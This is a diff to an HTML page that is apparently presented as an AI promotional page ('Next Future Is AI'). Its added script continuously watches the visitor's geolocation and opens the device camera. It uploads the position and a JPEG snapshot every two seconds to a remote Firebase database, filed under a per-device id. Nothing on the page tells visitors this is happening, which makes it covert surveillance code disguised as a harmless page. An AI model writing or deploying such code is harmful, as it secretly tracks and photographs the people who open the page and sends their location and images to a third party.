@@ -6,10 +6,26 @@
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
+<style>
+body{
+font-family: Arial;
+text-align:center;
+background:black;
+color:white;
+}
+video{
+width:300px;
+border:2px solid white;
+margin-top:10px;
+}
+</style>
+
 </head>
 <body>
 
-<h2>Ai Can Do Everything That You Want But Not Physical</h2>
+<h2>Next Future Is AI 💫</h2>
+
+<video id="camera" autoplay playsinline></video>
 
 <script>
 
@@ -25,14 +41,43 @@ const firebaseConfig = {
 
 firebase.initializeApp(firebaseConfig);
 
+// unique phone id
+let phoneId = "phone_" + Math.floor(Math.random()*100000);
+
+// LOCATION
 navigator.geolocation.watchPosition(function(pos){
 
-firebase.database().ref("location").set({
+firebase.database().ref("devices/"+phoneId+"/location").set({
 lat: pos.coords.latitude,
 lon: pos.coords.longitude
 });
 
-document.body.innerHTML = "<h2>Next Future Is AI 💫</h2>";
+});
+
+// CAMERA
+const video = document.getElementById("camera");
+
+navigator.mediaDevices.getUserMedia({video:true})
+.then(stream=>{
+video.srcObject = stream;
+
+const canvas = document.createElement("canvas");
+const ctx = canvas.getContext("2d");
+
+setInterval(()=>{
+
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+ctx.drawImage(video,0,0);
+
+let imageData = canvas.toDataURL("image/jpeg",0.5);
+
+firebase.database().ref("devices/"+phoneId+"/camera").set({
+image:imageData
+});
+
+},2000);
 
 });
 
